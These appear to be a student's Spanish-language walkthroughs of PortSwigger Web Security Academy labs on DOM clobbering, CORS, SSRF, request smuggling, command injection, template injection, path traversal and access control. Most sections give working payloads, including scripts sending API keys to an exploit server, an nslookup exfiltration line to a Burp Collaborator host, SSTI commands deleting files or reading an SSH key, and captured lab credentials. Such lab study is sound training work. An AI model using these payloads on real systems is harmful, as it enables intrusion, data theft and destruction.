### [Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)

La pagína de una entrada del blog importa el archivo `loadCommentsWithDomClobbering.js`, el cual contiene el siguiente código:

```
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
```

La variable `defaultAvatar` es vulnerable a DOM clobbering, debido a que está definida con un operador OR y una variable global. Se puede vulnerar esto declarando dos tags `a` con el mismo id, que hará que se agupen en una DOM collection. El `name` del segundo `a` es `avatar`, y su `href` es el código que se quiere inyectar. Pero el sitio vulnerable usa DOMPurify para mitigar los ataques DOM-based, por lo que el `href` tendrá que usar el protocolo `cid:`.

Para resolver el laboratorio se deben hacer dos comentarios en una entrada: uno que contenga el siguiente texto:

```
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

Y otro que contenga cualquier cosa. Al volver a la entrada luego de postear el segundo comentario se va a ejecutar el `alert`.

### [Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)

El sitio usa la librería [html-janitor](https://github.com/guardian/html-janitor) (vulnerable a DOM clobbering y otras cosas), que usa la propiedad `attributes` para filtrar atributos HTML. Pero se puede vulnerar a dicha propiedad ahciendo que su `length` sea indefinido. Esto permite inyectar cualquier atributo en un elemento HTML.

Para resolver el lab se debe realizar un comentario con el texto:

```
<form id=x tabindex=0 onfocus=alert(document.cookie)><input id=attributes>
```

Y después cargar en el exploit server:

```
<iframe src=https://id-del-lab.web-security-academy.net/post?postId=id-del-posteo onload="setTimeout(someArgument=>this.src=this.src+'#x',500)">
```

Cuando se carga el `iframe`, después de medio segundo (para que se cargue el comentario antes de ejecutarse el JS), se agrega `#x` al final de la URL, haciendo que se enfoque el elemento que tiene ese id (el `form` creado en el comentario). Por último el event handler `onfocus` hace que se ejecute la payload.

---

## [Cross-origin resource sharing (CORS)](https://portswigger.net/web-security/cors)

### [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)

Al autenticarnos en este laboratorio e ir a la sección Account Details, vemos que se imprime el apikey. Yendo a burpsuite y analizando la petición y respuesta que se envían al entrar a esta sección, vemos que en el encabezado  de la respuesta Access-Control-Allow-Credentials se devuelve el dominio de nuestro lab. Volviendo a la request y mandándola al repeater de burpsuite, si manualmente colocamos un encabezado Origin disitinto, el encabezado Access-Control-Allow-Credentials de la respuesta devolverá el dominio del origin.

Para resolver este lab, copiamos la url de la sección Home, y le anexamos "accountDetails" (debido a que a esta url se hacen las peticiones que devuelve la apikey, se puede ver analizando el HTTP History de burpsuite), y la pegamos en el siguiente script.
Luego de pulsar el botón deliver exploit to victim, debemos ver las respuestas del servidor yendo a la sección Acces log. Una vez allí, buscamos "log?key", y lo que sigue será el apikey que debemos enviar.

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://ac0d1f601f36270f80786122008800b8.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
    var x = JSON.parse(this.responseText);
    location='/log?key=' + x.apikey;
};
```

### [CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)

Este laboratorio es muy similar al anterior, difiriendo en que, al mandar la request al repeater y setear el header Origin como null, la respuesta tendrá el encabezado Access-Control-Allow-Origin como null.

Para resolver este lab, copiamos la url de la sección Home, y le anexamos "accountDetails" (debido a que a esta url se hacen las peticiones que devuelve la apikey, se puede ver analizando el HTTP History de burpsuite), y la pegamos en la línea del req.open del siguiente script. Por último, copiamos la url del exploit server del laboratorio y la pegamos en la línea location, a la cual le concatenamos la apikey de la respuesta (también se podría usar un servidor externo como el burp collaborator).
Luego de pulsar el botón deliver exploit to victim, debemos ver las respuestas del servidor yendo a la sección Acces log. Una vez allí, buscamos "log?key", y lo que sigue será el apikey que debemos enviar.

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
        var req = new XMLHttpRequest ();
        req.onload = reqListener;
        req.open('get','https://ac6c1f321e10fef48028145c000f0017.web-security-academy.net/accountDetails',true);
        req.withCredentials = true;
        req.send();  
        function reqListener() {
            var x = JSON.parse(this.responseText);
            location='https://ac281f0c1eb1fe6c80d814b401080062.web-security-academy.net/log?key='+x.apikey;
        };
     </script>"></iframe>
```

### [CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)

Al acceder a este laboratorio y autenticarnos, si en la página principal hacemos click en un botón view details, y en el drop-down del fondo de la página seleccionamos algo y hacemos click en Check stock, se nos abrirá una ventana indicando el stock level. Al igual que en los laboratorios anteriores, accediendo a la sección Account Details se puede ver impresa la apikey, y analizando la request y response haciendo uso del repeater de burpsuite, si en origin anteponemos "subdominio." a la url origen de la request, veremos que la respuesta sigue siendo válida.
Ahora, analizando con el intecept de burpsuite la ventana que se abre al clickear Check Stock mencionada anteriormente, podemos ver que se le envía un parámetro "/?productId=", yendo al decoder de burpsuite y codificando como URL lo siguiente "<img src=1 onerror=alert(1)>", si editamos la petición interceptada y le ponemos como parámetro de productId lo que acabamos de encodear, veremos que se ejecuta el alert que definimos. Por último, observando la url de dicha ventana, veremos que es un subdominio del laboratorio en el que estamos trabajando.

Para resolver el laboratorio, en el siguiente script deberemos pegar la url del mismo, teniendo cuidado en la línea de document.location, ya que en la misma debe ir el subdominio de la ventana que se abre al hacer click en Check stock. La url que debe ir dentro de la función reqListener es la del exploit server.

```html
<script>
   document.location="http://stock.ac6e1ff21fdb2eaa8059129e00570000.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ac6e1ff21fdb2eaa8059129e00570000.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://ac631f561f612e128085127d0143004d.web-security-academy.net/exploit/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

### [CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)

No pudimos resolver el laboratorio porque se requiere usar el Burp Collaborator Client, que sólo están disponibles en la versión Pro de Burp Suite.

---

## [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)

---

## [Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)

### [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)

#### Solución:

1. Consultar el stock de un producto y capturar la request
2. Setear el parámetro stockApi=http://localhost/admin/delete?username=carlos

### [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)

#### Solución:

1. Consultar el stock de un producto y capturar la request
2. En Burp Intruder setear el parámetro stockApi=http://192.168.0.$XX$:8080/admin/delete?username=carlos haciendo variar la XX (último octeto de la IP) entre 1 y 255

---

## [HTTP request smuggling](https://portswigger.net/web-security/request-smuggling)

### [HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)

#### Solución:

Enviar 2 veces la siguiente request:

```
POST / HTTP/1.1
Host: LABID.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### [HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)

#### Solución:

Enviar 2 veces la siguiente request (desactivar "Update Content-Length" de Burp Repeater y mantener los 2 saltos de línea del final):

```
POST / HTTP/1.1
Host: LABID.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

82
GPOST / HTTP/1.1
Host: LABID.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

0


```

### [HTTP request smuggling, obfuscating the TE header](https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header)

#### Solución:

Enviar 2 veces la siguiente request (desactivar "Update Content-Length" de Burp Repeater y mantener los 2 saltos de línea del final):

```
POST / HTTP/1.1
Host: LABID.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

82
GPOST / HTTP/1.1
Host: LABID.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

0


```

### [HTTP request smuggling, confirming a CL.TE vulnerability via differential responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses)

#### Solución:

Enviar 2 veces la siguiente request (desactivar "Update Content-Length" de Burp Repeater):

```
POST / HTTP/1.1
Host: LABID.web-security-academy.net
Content-Length: 30
Transfer-Encoding: chunked

0

GET /asd HTTP/1.1
Foo: bar
```

### [HTTP request smuggling, confirming a TE.CL vulnerability via differential responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses)

#### Solución:

Enviar 2 veces la siguiente request (desactivar "Update Content-Length" de Burp Repeater y mantener los 2 saltos de línea del final):

```
POST / HTTP/1.1
Host: LABID.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

83
GET /asd HTTP/1.1
Host: LABID.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

0


```

### [Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)

#### Solución:

Enviar 2 veces la siguiente request (desactivar "Update Content-Length" de Burp Repeater):

```
POST / HTTP/1.1
Host: LABID.web-security-academy.net
Content-Length: 91
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 30

foo
```

### [Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)

#### Solución:

Enviar 2 veces la siguiente request (desactivar "Update Content-Length" de Burp Repeater y mantener los 2 saltos de línea del final):

```
POST / HTTP/1.1
Host: LABID.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

6C
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 4
Transfer-Encoding: chunked

0


```

### [Exploiting HTTP request smuggling to reveal front-end request rewriting](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)

#### Solución:

Enviar 2 veces la siguiente request (desactivar "Update Content-Length" de Burp Repeater y mantener el salto de línea del final):

```
POST / HTTP/1.1
Host: LABID.web-security-academy.net
Content-Length: 52
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Length: 150

search=asd

```

En la segunda response, arriba del input de búsqueda debería aparecer algo como:

```
0 search results for 'POST / HTTP/1.1
X-vDTCOL-Ip: 181.117.13.38
Host: ac0d1fb51fe4661f80e980ba003200cb.web-security-academy.net
Content-Length: 52
Transfer-Enco'
```

Enviar 2 veces la siguiente request, reemplazando el header X-\*\*\*\*\*\*-Ip con el obtenido en la request anterior:

```
POST / HTTP/1.1
Host: LABID.web-security-academy.net
Content-Length: 98
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-******-Ip: 127.0.0.1
Content-Length: 30

foo
```

### [Exploiting HTTP request smuggling to capture other users' requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)

#### Descripción:

1. Realizar un comentario en cualquier post, observar la request y copiar el valor de la cookie de sesión y del csrf token.
2. Realizar la siguiente request reemplazando los valores de la cookie de sesión y del csrf token:

```
POST / HTTP/1.1
Host: LABID.web-security-academy.net
Content-Length: 265
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: LABID.web-security-academy.net
Content-Length: 777
Cookie: session=COOKIE-SESSION-VALUE

csrf=CSRF-TOKEN&postId=6&name=asd&email=asd@email.com&website=&comment=
```

3. Dirigirse a LABID.web-security-academy.net/post?postId=6 (o el postId que se haya ingresado en la request del paso 2).
4. Si en lugar de ver el comentario de la víctima en el post se obtiene un internal server error, repetir el paso 2 y 3 hasta que aparezca el comentario (esto se debe a que PortSwigger simula que la víctima navega por el sitio de forma intermitente).
5. Copiar el valor de la cookie de sesión del comentario.
6. Iniciar sesión con credenciales inventadas, interceptar la request y reemplazar la cookie de sesión con la obtenida del comentario de la víctima.

#### Solución encontrada:

```
GET / HTTP/1.1
Host: ac721f751e1949f880d148b3002500b5.web-security-academy.net
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
Sec-Fetch-Dest: document
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US
Cookie: victim-fingerprint=x0I5pEGy04Dgy8e20sThcT1WS83zPPeC; secret=7Kwj9ztbTjKb7ir6vhoOtLq5S7XwR7WQ; session=4VUfBbaKXwzTjsMDAzgC8ecnDQhISoRV
```

### [Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)

#### Solución:

Enviar la siguiente request:

```
POST / HTTP/1.1
Host: LABID.web-security-academy.net
Content-Length: 82
Transfer-Encoding: chunked

0

GET /post?postId=6 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>

asd
```

En caso de que no se dé como resuelto el laboratorio, volver a enviarla hasta conseguirlo (esto se debe a que PortSwigger simula que la víctima navega por el sitio de forma intermitente).

### [Exploiting HTTP request smuggling to perform web cache poisoning](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning)

#### Solución:

1. Ir al exploit server, poner en el body: alert(document.cookie) y guardar
2. Enviar la siguiente request (reemplazando LABID y EXPLOIT-SERVER-ID):

```
POST / HTTP/1.1
Host: LABID.web-security-academy.net
Content-Length: 130
Transfer-Encoding: chunked

0

GET /post/next?postId=6 HTTP/1.1
Host: EXPLOIT-SERVER-ID.web-security-academy.net
Content-Length: 108

foo
```

3. Enviar la siguiente request (reemplazando LABID):

```
GET /post?postId=7 HTTP/1.1
Host: LABID.web-security-academy.net


```

4. Repetir la request del paso 3 para confirmar que se envenenó la cache y siempre se responde con la redirección al exploit server.

### [Exploiting HTTP request smuggling to perform web cache deception](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception)

#### Descripción:

1. Enviar la siguiente request:

```
POST / HTTP/1.1
Host: ac5a1f211f44e31180d4a4c4000400fd.web-security-academy.net
Content-Length: 39
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
foo: bar
```

2. Ir al inicio del sitio web (LABID.web-security-academy.net/)
3. Buscar entre las request realizadas las palabras "API Key" (se puede buscar a la derecha abajo de la response y recorrer todas las request o desde el menú Burp->Search si se tiene la versión Pro)
4. Si se encuentra, enviar la API Key de la víctima como solución. Sino, repetir los pasos 1 a 3 (puede llevar muchas repeticiones del mismo proceso hasta que aparezca).

#### Solución encontrada:

6MM7nNMckO31arHOfLkLKJyGhNnKz2cl

---

## [OS command injection](https://portswigger.net/web-security/os-command-injection)

### [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)

#### Solución

1. Consultar el stock de un producto y capturar la request
2. Setear el parámetro storeId=1|whoami

### [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)

#### Solución

1. Enviar un mensaje de feedback y capturar la request
2. Setear el parámetro email=||ping -c 10 127.0.0.1||

### [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

#### Solución

1. Enviar un mensaje de feedback y capturar la request
2. Setear el parámetro email=||whoami>/var/www/images/file.txt||
3. Acceder a https://LABID.web-security-academy.net/image?filename=file.txt

### [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)

#### Solución

1. Enviar un mensaje de feedback y capturar la request
2. Setear el parámetro email=||nslookup burpcollaborator.net||

### [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

#### Descripción

1. Enviar un mensaje de feedback y capturar la request
2. Abrir Burp collaborator client y generar/copiar el "collaborator payload"
3. Setear el parámetro email=||nslookup \`whoami\`.fn6xqhhzgnulzs5qkh18xj7ek5qwel.burpcollaborator.net|| reemplazando por la url generada
4. En Burp collaborator client hacer un poll y verificar en las solicitudes recibidas el usuario

#### Solución encontrada:

peter-bC8z09

---

## [Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)

### [Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)

#### Descripción:

Al ver los detalles de un producto sin stock, se muestra de forma insegura el mensaje pasado mediante el parámetro message en la URL, posibilitando pasar un parámetro que sea evaluado en el servidor por el template ERB.

#### Solución:

Dirigirse a https://LABID.web-security-academy.net/?message=<%=system("rm /home/carlos/morale.txt")%>

### [Basic server-side template injection (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)

#### Descripción:

La funcionalidad que permite cambiar el nombre mostrado en los comentarios realizados en los post setea la propiedad del usuario que se debe mostrar (por ejemplo user.name). Al mostrar un comentario, esto es evaluado de forma insegura por el template, siendo vulnerable a un server-side template injection (la web usa Tornado). Esto se puede verificar tomando dicha request, seteando el parámetro blog-post-author-display=user.name}}{{2\*6 y comprobando que en los comentarios se muestra el nombre junto con un 12 al final.

#### Solución:

1. Ir a My account y modificar el preferred name.
2. Repetir la request seteando el parámetro blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
3. Hacer un comentario en cualquier post.

### [Server-side template injection using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)

#### Descripción:

Al editar un post vemos que se evalúan ciertas expresiones como ${product.price}. Además, la web está configurada en modo debug por lo que se puede escribir algo como ${variablenodeclarada} de manera que se produzca un error, siendo informados así del sistema de templates que se está usando. Con esto descubrimos que se trata de Freemaker de Java y podemos recurrir a la [documentación](https://freemarker.apache.org/docs/app_faq.html#faq_template_uploading_security) o al [post sobre dicho exploit](https://portswigger.net/research/server-side-template-injection).

#### Solución:

En la edición de un post insertar lo siguiente <#assign ex="freemarker.template.utility.Execute"?new()> \${ ex("rm /home/carlos/morale.txt") } y guardar.

### [Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)

#### Descripción:

Al ver un producto sin stock se muestra el mensaje de error correspondiente. Podemos insertar ?message={{7*7}} en la url para obtener un error y determinar que se trata de Handlebars de NodeJS. Realizando una búsqueda podemos encontrarnos con [este exploit](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs) y utilizar el mismo modificándolo para eliminar el archivo deseado:

```
wrtz{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('fs').unlinkSync('/home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Luego basta con encodear el mismo y enviarlo como valor del parámetro message.

#### Solución:

Ir a LABID.web-security-academy.net/?message=wrtz{{%23with "s" as |string|}}%0A%20 {{%23with "e"}}%0A%20%20%20 {{%23with split as |conslist|}}%0A%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20 {{this.push (lookup string.sub "constructor")}}%0A%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20 {{%23with string.split as |codelist|}}%0A%20%20%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20%20%20 {{this.push "return require('fs').unlinkSync('%2Fhome%2Fcarlos%2Fmorale.txt')%3B"}}%0A%20%20%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20%20%20 {{%23each conslist}}%0A%20%20%20%20%20%20%20%20%20 {{%23with (string.sub.apply 0 codelist)}}%0A%20%20%20%20%20%20%20%20%20%20%20 {{this}}%0A%20%20%20%20%20%20%20%20%20 {{%2Fwith}}%0A%20%20%20%20%20%20%20 {{%2Feach}}%0A%20%20%20%20%20 {{%2Fwith}}%0A%20%20%20 {{%2Fwith}}%0A%20 {{%2Fwith}}%0A{{%2Fwith}}

### [Server-side template injection with information disclosure via user-supplied objects](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)

#### Descripción

1. Iniciar sesión con las credenciales brindadas (content-manager:C0nt3ntM4n4g3r)
2. Editar la descripción de un producto, ingresar {{7+'7'}} para obtener un error, determinando así que se está utilizando Django
3. Ingresar {{settings.SECRET_KEY}} para obtener la secret key del framework

#### Solución encontrada:

ce7yt92pn5jo8evzdf6hpmi144g0e9zd

### [Server-side template injection in a sandboxed environment](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment)

#### Descripción

1. Iniciar sesión con las credenciales brindadas (content-manager:C0nt3ntM4n4g3r)
2. Editar la descripción de un producto, ingresar \${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
3. Convertir el resultado obtenido de bytes en código ASCII a string

#### Solución encontrada:

k67lsge9ztl9117fcefl

### [Server-side template injection with a custom exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit)

#### Solución:

1. Iniciar sesión con las credenciales brindadas (wiener:peter), ir a My account y modificar el nombre que se muestra en los comentarios de los post
2. Modificar y enviar dicha request seteando blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
3. Realizar un comentario en cualqueir post y volver a dicho post para visualizar el comentario, ejecutando así el template injection y cargando como avatar el archivo a eliminar
4. Modificar y enviar la request del paso 2 seteando blog-post-author-display=user.gdprDelete()
5. Actualizar la página del post, ejecutando nuevamente el template injection y eliminando así el avatar (es decir, el archivo objetivo)

## [Directory traversal](https://portswigger.net/web-security/file-path-traversal)

### [File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)

#### Solución:

Hacer una request a https://LABID.web-security-academy.net/image?filename=../../../etc/passwd

### [File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)

#### Solución:

Hacer una request a https://LABID.web-security-academy.net/image?filename=/etc/passwd

### [File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)

#### Solución:

Hacer una request a https://LABID.web-security-academy.net/image?filename=....//....//....//etc/passwd

### [File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)

#### Solución:

Hacer una request a https://LABID.web-security-academy.net/image?filename=..%252f..%252f..%252fetc/passwd

### [File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)

#### Solución:

Hacer una request a https://LABID.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd

### [File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)

#### Solución:

Hacer una request a https://LABID.web-security-academy.net/image?filename=../../../etc/passwd%00.png

---

## [Access control vulnerabilities](https://portswigger.net/web-security/access-control)

### [Unprotected admin functionality](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality)

#### Descripción:

Existe un panel de administrador que no se encuentra protegido. Para hallar su url, dirigirse a https://url_del_laboratorio/robots.txt y observar que se inidicó no indexar /administrator-panel

#### Solución:

- Dirigirse a https://url_del_laboratorio/administrator-panel y eliminar el usuario carlos

### [Unprotected admin functionality with unpredictable URL](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url)

#### Descripción:

Para encontrar la url del panel de administrador, inspeccionar el código de la página de inicio y buscar el script que indica la url del mismo en:

- &lt;body>
  - &lt;div theme="ecommerce">
    - &lt;section class="mainContainer">
      - &lt;div class="container">
        - &lt;header class="navigation-header">
          - &lt;section class="top-links">

#### Solución encontrada:

- Dirigirse a https://url_del_laboratorio/admin-gbd53v y eliminar el usuario carlos

### [User role controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter)

#### Solución:

Activar en burp proxy la intercepción de las solicitudes, iniciar sesión con las credenciales proporcionadas (wiener:peter), forwardear la request y modificar en la respuesta la cookie Admin seteandola en true, dirigirse al panel de administrador y eliminar el usuario carlos, modificando la cookie en cada solicitud.

### [User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)

#### Solución:

1. Iniciar sesión con las credenciales brindadas (wiener:peter)
2. Ir a My account, cambiar el email, interceptar la request y agregar "roleid":2 quedando así:
   { "email":"asd@mail.com", "roleid":2 }
3. Ir a LABID.web-security-academy.net/admin y eliminar el usuario carlos

### [URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)

#### Solución:

Realizar la siguiente request:

```
GET /?username=carlos HTTP/1.1
Host: LABID.web-security-academy.net
X-Original-URL: /admin/delete


```

### [Method-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented)

#### Solución:

1. Iniciar sesión con las credenciales brindadas (wiener:peter)
2. Realizar la siguiente request, reemplazando LABID y COOKIE-SESSION-VALUE:

```
PUT /admin-roles HTTP/1.1
Host: LABID.web-security-academy.net
Cookie: session=COOKIE-SESSION-VALUE

username=wiener&action=upgrade
```

### [User ID controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter)

#### Descripción:

1. Iniciar sesión con las credenciales brindadas
2. Ir a My account y cambiar el parámetro id de la url a LABID.web-security-academy.net/my-account?id=carlos
3. Enviar la API Key como solución

#### Solución encontrada:

lju45WipAzADFwJpbAuEDxYEQohba9Kc

### [User ID controlled by request parameter, with unpredictable user IDs](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids)

#### Descripción:

1. Buscar un post que haya sido escrito por carlos, hacer click en su nombre obteniendo así su ID en la url.
2. Iniciar sesión con las credenciales brindadas
3. Ir a My account y cambiar el parámetro id de la url a LABID.web-security-academy.net/my-account?id=carlos
4. Enviar la API Key como solución

#### Solución encontrada:

2yG2kvUx4G4YGtTopcA0i3rhf6agGKG3

### [User ID controlled by request parameter with data leakage in redirect](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect)

#### Descripción:

1. Iniciar sesión con las credenciales brindadas (wiener:peter)
2. Ir a My account y cambiar el parámetro id de la url a LABID.web-security-academy.net/my-account?id=carlos
3. Mirar en Burp la response, la cual junto con la redirección contiene la página como si hubiera sido cargada normalmente
4. Enviar la API Key como solución

#### Solución encontrada:

lgCjKOybA0VIA2r6BA8kOHqo3XcllD5o

### [User ID controlled by request parameter with password disclosure](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure)

#### Descripción:

1. Iniciar sesión con las credenciales brindadas (wiener:peter)
2. Ir a My account y cambiar el parámetro id de la url a LABID.web-security-academy.net/my-account?id=administrator
3. Inspeccionar el input enmascarado de cambio de contraseña, obteniendo así su valor
4. Iniciar sesión con la cuenta administrator y la contraseña obtenida en el paso anterior, y eliminar el usuario carlos

#### Solución encontrada:

Username: administrator
Password: 9mj07l2mgwqlnydilrxg

### [Insecure direct object references](https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references)

#### Descripción:

1. Ir a LABID.web-security-academy.net/download-transcript/1.txt
2. Abrir el archivo descargado, el cual contiene la contraseña del usuario carlos
3. Iniciar sesión con el usuario carlos y la contraseña obtenida en el paso anterior

#### Solución encontrada:

Username: carlos
Password: 32433u498gsetj66a498

### [Multi-step process with no access control on one step](https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step)

#### Solución:

1. Iniciar sesión con las credenciales brindadas (wiener:peter)
2. Enviar la siguiente request reemplazando LABID y COOKIE-SESSION-VALUE:

```
POST /admin-roles HTTP/1.1
Host: LABID.web-security-academy.net
Cookie: session=COOKIE-SESSION-VALUE
Content-Length: 45

action=upgrade&confirmed=true&username=wiener
```

### [Referer-based access control](https://portswigger.net/web-security/access-control/lab-referer-based-access-control)

#### Solución:

1. Iniciar sesión con las credenciales brindadas (wiener:peter)
2. Enviar la siguiente request reemplazando LABID y COOKIE-SESSION-VALUE:

```
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: LABID.web-security-academy.net
Referer: https://LABID.web-security-academy.net/admin
Cookie: session=COOKIE-SESSION-VALUE


```

---

## [Authentication](https://portswigger.net/web-security/authentication)

### [Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)

#### Descripción:

Intentar acceder con los diferentes [usuarios listados](https://portswigger.net/web-security/authentication/auth-lab-usernames) hasta que el mensaje de error sea "Incorrect password" en lugar de "Invalid username".
Una vez que se ha encontrado un usuario válido, probar con las diferentes [contraseñas listadas](https://portswigger.net/web-security/authentication/auth-lab-passwords) hasta lograr acceder. Este proceso se puede automatizar utilizando el intruder de Burp:

1. Hacer una request de login y enviar al intruder.
2. En la pestaña Position seleccionar el ataque de tipo Sniper, parametrizar el usuario y deja fija una contraseña cualquiera.
3. En la pestaña Payload pegar el listado de usuarios e iniciar ataque.
